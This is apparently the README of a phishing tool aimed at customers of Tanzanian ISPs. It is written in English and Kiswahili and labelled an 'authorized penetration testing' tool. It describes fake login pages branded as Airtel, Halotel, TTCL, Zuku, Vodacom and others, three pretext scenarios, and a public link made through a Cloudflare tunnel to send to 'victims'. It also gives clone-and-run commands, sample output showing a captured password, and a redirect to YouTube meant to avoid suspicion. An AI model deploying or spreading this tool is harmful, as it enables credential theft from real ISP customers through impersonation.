🇹🇿 Advanced WiFi Credential Harvester for Tanzania Networks
Authorized Penetration Testing Tool — No Adapter Required
                                                                                                                                                                                                                                               
---

## 🧠 Overview / Maelezo ya Jumla

**ENGLISH:**
TZ-WiFi-Phisher-PRO is a powerful, link-based social engineering tool designed for authorized penetration testing of Tanzania's major ISPs. It works **without any WiFi adapter** — purely through a phishing link sent to the victim. The tool creates ISP-branded login pages that look official, captures the password when entered, and redirects the victim to YouTube to avoid suspicion. It uses **Cloudflare tunnel** to generate a public URL so the victim can be anywhere in the world.

**KISWAHILI:**
TZ-WiFi-Phisher-PRO ni tool ya kisasa ya social engineering iliyoundwa kwa ajili ya majaribio ya usalama yaliyoidhinishwa kwa ISP kubwa za Tanzania. Inafanya kazi **bila adapter yoyote ya WiFi** — kwa kutumia link tu inayotumwa kwa mwathirika. Tool inaunda kurasa za kuingia zinazoonekana rasmi kama za ISP, inakamata password inapoingizwa, na kumuelekeza mwathirika YouTube ili asishuku. Inatumia **Cloudflare tunnel** kupata URL ya umma ili mwathirika awe popote duniani.

<br>

---

## 🔥 Features / Vipengele

### 📶 Supported ISPs / ISP Zinazotumika

| Type | ISP | Color Theme | Scenario |
|------|-----|:-----------:|:--------:|
| 📶 **Mobile 4G/5G** | Airtel Tanzania | 🟥 Red | Security Update / Disconnected / Expired |
| 📶 **Mobile 4G/5G** | YAS (Yetu Access Services) | 🟦 Blue | Security Update / Disconnected / Expired |
| 📶 **Mobile 4G/5G** | Halotel Tanzania | 🟩 Green | Security Update / Disconnected / Expired |
| 📶 **Mobile 4G/5G** | TTCL Mobile | 🟦 Navy | Security Update / Disconnected / Expired |
| 🔌 **Fibre** | TTCL Fibre Broadband | 🟦 Navy | Fibre Update / Fibre Disconnected / Fibre Expired |
| 🔌 **Fibre** | Zuku Fibre | 🟧 Orange | Fibre Update / Fibre Disconnected / Fibre Expired |
| 🔌 **Fibre** | Vodacom Fibre | 🟥 Red | Fibre Update / Fibre Disconnected / Fibre Expired |
| 📡 **Generic** | General Template | 🟦 Blue | Security Update / Disconnected / Expired |

### ✅ Core Capabilities

| Feature | Description |
|---------|-------------|
| 🚫 **No WiFi Adapter** | Works with link only — pure HTTP server |
| ☁️ **Cloudflare Tunnel** | Auto-install & public URL generation |
| 🎭 **3 Attack Scenarios** | Security Update / Disconnected / Auth Expired |
| 🎨 **ISP Branded Pages** | Official look with correct colors & logos |
| 🔄 **Auto Redirect** | Victim sent to YouTube after capture |
| 📱 **Real-time Monitor** | Watch credentials appear live in terminal |
| 💬 **Social Scripts** | Pre-written Kiswahili scripts for each ISP |
| 💾 **Auto Save** | All passwords saved to file automatically |

<br>

---

## 📦 Installation / Usakinishaji

### Requirements
- Python 3.6+
- Linux (Kali Linux recommended)
- Internet connection (for Cloudflare tunnel)

### Quick Install

```bash
# Clone the repo
git clone https://github.com/mr-virus148/wifiphisher.git
cd wifiphisher

# Install dependencies
pip install colorama requests

# Run as root
sudo python3 wifihackv2.5.py                                                                                                         
 🎯 Usage / Matumizi
Step-by-Step Setup                                                                                                           ┌─────────────────────────────────────────────────┐
│                                                 │
│   [1/4] SELECT TARGET ISP                       │
│                                                 │
│      MOBILE WiFi (4G/5G):                       │
│         1) Airtel Tanzania                      │
│         2) YAS (Yetu Access Services)           │
│         3) Halotel Tanzania                     │
│         4) TTCL Mobile                          │
│                                                 │
│      FIBRE WiFi (Home/Office):                  │
│         5) TTCL Fibre Broadband                 │
│         6) Zuku Fibre                           │
│         7) Vodacom Fibre                        │
│                                                 │
│         8) Generic Template                     │
│                                                 │
│   [2/4] SELECT SCENARIO                         │
│         1) Security Update                      │
│         2) Disconnected                         │
│         3) Authentication Expired               │
│                                                 │
│   [3/4] CLOUDFLARE TUNNEL                       │
│         y = Yes (creates public URL)            │
│         N = No (local network only)             │
│                                                 │
│   [4/4] ✅ SERVER STARTED ON PORT 8080           │
│                                                 │
└─────────────────────────────────────────────────┘                                                                                                                                                                                                          ☁️ Cloudflare Tunnel
No ngrok. No port forwarding. No static IP.

The tool automatically:

Downloads & installs cloudflared (if missing)
Creates a free public URL: https://xxx.trycloudflare.com
Keeps tunnel alive for the entire session                                                                                              
              sample output                                                                                                                    ╔══════════════════════════════════════════════════════════════╗
║     🇹🇿  TZ-WiFi-Phisher-PRO v2.5 - FIBRE EDITION  🇹🇿      ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║   🎯  LINK YA KUMTUMIA VICTIM:                               ║
║   https://xyz.trycloudflare.com/wifi?isp=zuku&scenario=update║
║                                                              ║
║   📋 DETAILS:                                                ║
║   ISP        : Zuku Fibre (Fibre)                            ║
║   Scenario   : Security Update                               ║
║   Tunnel     : ✅ Cloudflare Active                          ║
║                                                              ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║   ✅ PASSWORD CAPTURED - 2026-06-27 14:30:22                 ║
║   🌐 Provider  : zuku                                       ║
║   🔑 Password  : Zuku@2026                                  ║
║   📱 IP        : 192.168.1.00                            ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝                                                                                how it works                                                                                                              ┌─────────────┐         ┌──────────────────┐
         │   ATTACKER   │────────▶│   HTTP SERVER    │
         │  (Kali Linux)│         │   (Port 8080)    │
         └──────┬──────┘         └────────┬─────────┘
                │                         │
                │ Cloudflare Tunnel       │ ISP Template
                │ (Public URL)            │ Generator
                ▼                         ▼
         ┌─────────────────────────────────────────┐
         │          VICTIM'S BROWSER                │
         │                                          │
         │  1. Clicks link                          │
         │  2. Sees ISP-branded login page          │
         │  3. "WiFi Security Update Required"      │
         │  4. Enters WiFi password                 │
         │  5. Redirected to YouTube (innocent)     │
         │  6. Password saved to attacker's file   │
         └─────────────────────────────────────────┘

